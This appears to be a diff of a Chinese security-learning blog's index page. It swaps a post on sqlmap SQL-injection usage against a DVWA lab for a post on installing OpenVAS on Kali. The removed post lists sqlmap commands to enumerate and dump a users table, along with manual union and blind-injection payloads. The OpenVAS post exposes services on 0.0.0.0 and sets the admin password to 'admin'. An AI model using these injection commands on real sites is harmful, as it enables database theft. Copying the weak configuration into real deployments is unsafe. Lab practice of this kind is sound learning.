@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-sqlmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-kail_安装openvas" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/13/sqlmap/">kail 2.0sqlmap使用</a>
+      <a class="article-title" href="/2018/06/13/kail_安装openvas/">kail 安装openvas</a>
     </h1>
   
 
 		
         
-        <a href="/2018/06/13/sqlmap/" class="archive-article-date">
+        <a href="/2018/06/13/kail_安装openvas/" class="archive-article-date">
   	<time datetime="2018-06-13T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-13</time>
 </a>
         
@@ -180,13 +180,19 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>sqlmap用法</p>
+<p>安装OpenVAS</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find / -name sqlmap.py 2&gt;&gt;null</span><br><span class="line">cd /usr/share/sqlmap</span><br><span class="line"></span><br><span class="line">//使用sqlmap检测是路径是否有注入点</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos;</span><br><span class="line">//获取数据库名称 --dbs参数</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --dbs</span><br><span class="line">//获取表名 -D数据库名称 --tables枚举表名</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa --tables </span><br><span class="line">//枚举数据库下的表的列</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; -D dvwa -T users --columns</span><br><span class="line">//下载数据 --dump</span><br><span class="line">python sqlmap.py -u &apos;http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&apos; --cookie=&apos;security=low; PHPSESSID=jd419octe4f8ocuakl5l5oghl0&apos; --tables -T users --columns --dump</span><br><span class="line">//获取交互的shell</span><br><span class="line">python sqlmap.py -h | grep shell</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>sql注入</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql </span><br><span class="line">1. 使用#或--注释掉后面的</span><br><span class="line">2. 使用union select 1,2 猜测返回的列数</span><br><span class="line">3. 使用union select 1,2 form tables 获取其他表的数据</span><br><span class="line">4. 使用union password,concat(first_name,&apos; &apos;,last_name,&apos; &apos;,user) form users //拼接字段输出更多信息</span><br><span class="line">5. 如果union可行,则可以使用version(),database(),user()等函数获取信息</span><br><span class="line"></span><br><span class="line">//拆半猜解法 最好使用sqlmap等工具</span><br><span class="line">and length(database()) &gt; 11 猜测数据库名长度</span><br><span class="line">and ascii(substring(database(),1,1))&gt;97 猜测第一个字符</span><br></pre></td></tr></table></figure>
+<ol>
+<li>更新系统<br>apt-get update<br>apt-get upgrade<br>注意此处python版本要在2.x版本</li>
+<li><p>openvas安装包 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. 执行apt-get install openvas,出现错误</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">执行openvas-check-setup 出现如下错误</span><br><span class="line">ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</span><br><span class="line">        FIX: You should start the redis-server or configure it to listen on socket: /var/run/redis-openvas/redis-server.sock</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">#apt-get remove redis-server 不确定这2句是否需要先尝试下面的,如果不行再执行这2句</span><br><span class="line">#apt-get install openvas</span><br><span class="line">先ps -aux | grep redis </span><br><span class="line">kill -9 redis的进程PID否则一直不能成功</span><br><span class="line">redis-server /etc/redis/redis-openvas.conf </span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">再执行openvas-check-setup 出现如下错误</span><br><span class="line">ERROR: The NVT collection is very small.</span><br><span class="line">        FIX: Run a synchronization script like greenbone-nvt-sync.</span><br><span class="line">执行 openvas-feed-update</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line">再执行openvas-check-setup</span><br><span class="line">It seems like your OpenVAS-9 installation is OK.</span><br><span class="line"></span><br><span class="line">5.</span><br><span class="line">openvas-setup</span><br><span class="line">用户名:admin</span><br><span class="line">密码:720bb0d5-1898-4165-bdee-cf73dd0844ee</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>OpenVAS配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1)设置外部访问</span><br><span class="line"> vim /lib/systemd/system/greenbone-security-assistant.service</span><br><span class="line"> 	1.修改greenbone-security-assistant.service监听地址	</span><br><span class="line">	修改127.0.0.1为0.0.0.0</span><br><span class="line"> 	2.增加host头主机地址(IP或域名) </span><br><span class="line">    --mlisten=0.0.0.0 后面添加--allow-header-host=10.10.10.130(安装机地址)</span><br><span class="line"> vim /lib/systemd/system/openvas-manager.service</span><br><span class="line"> 	1.修改127.0.0.1为0.0.0.0</span><br><span class="line"> vim /etc/default/openvas-manager</span><br><span class="line">	1.修改127.0.0.1为0.0.0.0</span><br><span class="line"> vim /etc/default/greenbone-security-assistant</span><br><span class="line">	1.GSA_ADDRESS修改127.0.0.1为0.0.0.0</span><br><span class="line">	2.MANAGER_ADDRESS修改127.0.0.1为0.0.0.0</span><br><span class="line"> 重新装载 </span><br><span class="line">    1.openvas-stop </span><br><span class="line">    2.systemctl daemon-reload</span><br><span class="line"> 重新启动openvas </span><br><span class="line">    1.openvas-stop </span><br><span class="line">    2.openvas-start</span><br><span class="line"> 完整性检测 openvas-check-setup</span><br><span class="line"></span><br><span class="line">2)修改密码</span><br><span class="line">  openvasmd --user=admin --new-password=admin</span><br><span class="line"></span><br><span class="line">3)升级插件和漏洞库</span><br><span class="line">方法一：</span><br><span class="line"># openvas-feed-update //初始化安装，可以不用更新</span><br><span class="line">方法二：</span><br><span class="line"># greenbone-nvt-sync</span><br><span class="line"># greenbone-scapdata-sync  </span><br><span class="line"># greenbone-certdata-sync</span><br><span class="line">建议使用方法一进行升级。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>4.服务和openvas启动关闭脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.3个服务的启动</span><br><span class="line">systemctl start greenbone-security-assistant openvas-scanner openvas-manager</span><br><span class="line">或者分别启动某个服务</span><br><span class="line">systemctl start greenbone-security-assistant</span><br><span class="line">systemctl start openvas-scanner</span><br><span class="line">systemctl start openvas-manager</span><br><span class="line"></span><br><span class="line">2.openvas启动与关闭</span><br><span class="line">	openvas-stop </span><br><span class="line">    openvas-start</span><br></pre></td></tr></table></figure></p>
+
       
 
       
@@ -201,14 +207,6 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kail</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">metasploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
-        		</li>
       		
 		</ul>
 	</div>
@@ -217,7 +215,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/06/13/sqlmap/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/06/13/kail_安装openvas/">展开全文 >></a>
         </p>
       
 
@@ -513,90 +511,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-linux 自启动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/27/linux 自启动/">linux服务自启动</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/04/27/linux 自启动/" class="archive-article-date">
-  	<time datetime="2018-04-27T06:37:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-27</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>centos7 kail2.0(debain7)设置<br>systemctl list-unit-files|grep enabled #查看那些服务自启<br>systemctl enable xxx #开启某个服务自启</p>
-<p>未有systemcl之前的系统<br>chkconfig<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list / --list sshd #查看有什么服务自启动/查看sshd服务自启动</span><br><span class="line">chkconfig servicename on/off</span><br><span class="line">chkconfig --level 35 sshd on #级别3和5开机自启动</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>原理</p>
-</blockquote>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/27/linux 自启动/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-中央帝国的财政秘密" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -655,6 +569,90 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/04/27/中央帝国的财政秘密/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-linux 自启动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/27/linux 自启动/">linux服务自启动</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/04/27/linux 自启动/" class="archive-article-date">
+  	<time datetime="2018-04-27T06:37:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-27</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>centos7 kail2.0(debain7)设置<br>systemctl list-unit-files|grep enabled #查看那些服务自启<br>systemctl enable xxx #开启某个服务自启</p>
+<p>未有systemcl之前的系统<br>chkconfig<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list / --list sshd #查看有什么服务自启动/查看sshd服务自启动</span><br><span class="line">chkconfig servicename on/off</span><br><span class="line">chkconfig --level 35 sshd on #级别3和5开机自启动</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>原理</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/27/linux 自启动/">展开全文 >></a>
         </p>
       
 
@@ -1122,15 +1120,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1138,7 +1128,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1146,11 +1136,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1159,6 +1153,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1210,15 +1212,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1238,11 +1236,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
+                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
               </li>
              
               <li class="article-tag-list-item">
